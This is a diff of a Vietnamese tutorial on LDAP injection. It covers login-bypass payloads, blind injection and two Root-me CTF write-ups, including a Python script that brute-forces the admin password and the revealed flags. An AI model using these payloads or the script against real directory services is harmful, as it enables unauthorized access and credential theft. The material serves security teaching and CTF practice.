@@ -16,7 +16,7 @@ Tuy nhiên nếu nhập vào ``username=*`` và ``pass=*`` thì câu truy v
 ```
 find("(&(user=*)(userPassword=*))")
 ```
-``*`` trong LDAP nghĩa là "select all", nó sẽ trả về danh sách của tất cả người dùng.\
+``*`` trong LDAP là wildcard tượng trưng cho mọi ký tự hay cụ thể trong câu querry trên nó tương tự như "select all", nó sẽ trả về danh sách của tất cả người dùng.\
 Còn nều ta nhập vào ``username=*)(user=*))(|(user=*`` thì câu querry sẽ thành
 ```
 find("(&(user=*)(user=*))(|(user=*)(userPassword=" + pass +"))")
@@ -30,13 +30,13 @@ cả 2 vế ``user=*`` đều phải bằng True do có toán tử ``& (AN
 ## 3. Một số kiểu LDAPi
 #### A. Login bypass LDAPi
 Đầu tiên là login bypass LDAPi, chính là ví dụ ở trên đã minh họa. Ta có thể sử dụng toán tử ``&(AND)`` hoặc toàn tử ``|(OR)`` để bypass\
-Ví dụ sử dụng toán tử ``&(AND)``
+Sử dụng toán tử ``&(AND)``
 ```
 user=*)(&
 password=*)(&
 --> (&(user=*)(&)(password=*)(&)) //cụm (&) là luôn luôn True
 ```
-Ví dụ sử dụng toán tử ``|(OR)``
+Sử dụng toán tử ``|(OR)``
 ```
 user=*)(|(&
 pass=aaa)
@@ -54,8 +54,8 @@ Ví dụ:
 (|(user=value1)(password=value2))
 ```
 ### C.Blind LDAPi
-Tương tự như Blind SQLi thì Blind LDAPi là dạng mà respone tiết lộ rất ít thông tin, thông thường response chỉ trả về True hoặc False hoặc chỉ hiện thông báo lỗi
-Ví dụ ta muốn brute force pass của admin, ta biết cây querry có dạng như sau:
+Tương tự như Blind SQLi thì Blind LDAPi là dạng mà respone tiết lộ rất ít thông tin, thông thường response chỉ trả về True hoặc False hoặc chỉ hiện thông báo lỗi\
+Ví dụ ta muốn brute force pass của admin, ta biết câu querry có dạng như sau:
 ```
 (&(username=admin)(password='input'))
 ```
@@ -73,7 +73,7 @@ Ta tiến hành brute force với payload sau:
 ```
 Cứ như vậy ta tìm được pass của admin
 
-Ngoài ra cũng có AND Blind LDAPi và OR Blind LDAPi. Ở ví dụ trên chính là AND Blind LDAPi, blind LDAPi mà querry có sẳn ``&``. Còn OR Blind LDAPi thì querry có sẳn ``|`` 
+Ngoài ra cũng có ``and blind LDAPi`` và or ``blind LDAPi``. Ở ví dụ trên chính là and blind LDAPi, blind LDAPi mà querry có sẳn ``&``. Còn or blind LDAPi thì querry có sẳn ``|`` 
 
 ## 4. CTF Example
 ### A. LDAP injection - Authentication (Root-me) 
@@ -96,3 +96,67 @@ password=*)(&
 
 Paylaod inject thành công ta chỉ cần mở source lên và nhìn flag
 > **FLAG**: SWRwehpkTI3Vu2F9DoTJJ0LBO
+
+### B. LDAP injection - Blind (Root-me)
+Challenge cho ta một trang login dùng method POST và một trang search email người dùng dùng method GET.\
+Lướt qua trang login, ta thấy form sẽ gửi đi ``username`` và ``password`` ,ta dùng thử các payload thông thường nhưng dường như đều bị filter.\
+Thử nhập một input bất kỳ trong trang ``search`` ta nhận được:
+![burp-blind-1](./img/burp-blind-1.png)
+Ta thấy có một user là admin, ta thử nhập input là ``admin`` :
+![burp 2](./img/burp-blind-2.png)
+Từ respone ta dự đoán câu truy vấn LDAP có thể có dạng:
+```
+(&(sn=*)(email=input))
+```
+Tuy nhiên khi thử với các input khác, khi input là ```d``` thì output  vẫn cho ra kết quả:
+![burp 3](./img/burp-blind-3.png)
+Điều này cho ta một manh mối rằng trước và sau ``input`` sẽ có ``*`` bởi vì nếu search ``d`` thì vẫn tìm thấy ``admin``. Từ đó suy ra câu lệnh truy vấn sẽ có dạng
+```
+(&(sn=*)(email=*input*))
+```
+Bài này yêu cầu ta tìm password của admin, vì thế ta sẽ lợi dụng câu truy vấn này để brute force
+> Idea: Ta sẽ thêm trường password vào câu lệnh truy vấn, và dùng ``*`` để brute force từng ký tự trong password, nếu ký tự đó có mặt trong password thì respone sẽ trả về email của admin
+
+Payload sẽ có dạng:
+```
+..../?action=dir&search=admin*)(password=a*    -> Sai
+..../?action=dir&search=admin*)(password=b*    -> Sai
+..../?action=dir&search=admin*)(password=c*    -> Sai
+..../?action=dir&search=admin*)(password=d*    -> Đúng
+..../?action=dir&search=admin*)(password=da*   -> Sai
+
+....
+....
+```
+Cứ thế brute force đến khi nào tìm thấy password\
+Script brute force:
+```python
+import requests
+import string
+from bs4 import BeautifulSoup
+
+wordlist = string.ascii_letters
+wordlist += "".join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '-', '_', "'", '{', '}']) 
+url = "http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin*)(password="
+
+flag = ""
+while True:
+    for c in wordlist:
+        sendUrl = url+c
+        res = requests.get(sendUrl)
+        suop = BeautifulSoup(res.text, "html.parser")
+
+        print("Try pass [*]", c)
+
+        if(suop.p.get_text()[0:1] == '1'):
+            flag += c
+            url += c
+            print("Pass[*]:", flag)
+            break
+    else:
+        break
+print("Final pass:",flag)
+```
+>**Giải thích:** đoạn ``suop.p.get_text()[0:1] == '1'`` là lấy nội dung của respone từ tag <p> sau đó cắt lấy đoạn đầu. Nếu nó bằng 1 nghĩa là response trả về 1 result là admin -> trường hợp này đúng, sau đó thêm ký tự đang test vào flag
+
+>**FLAG:** dsy365gdzerzo94
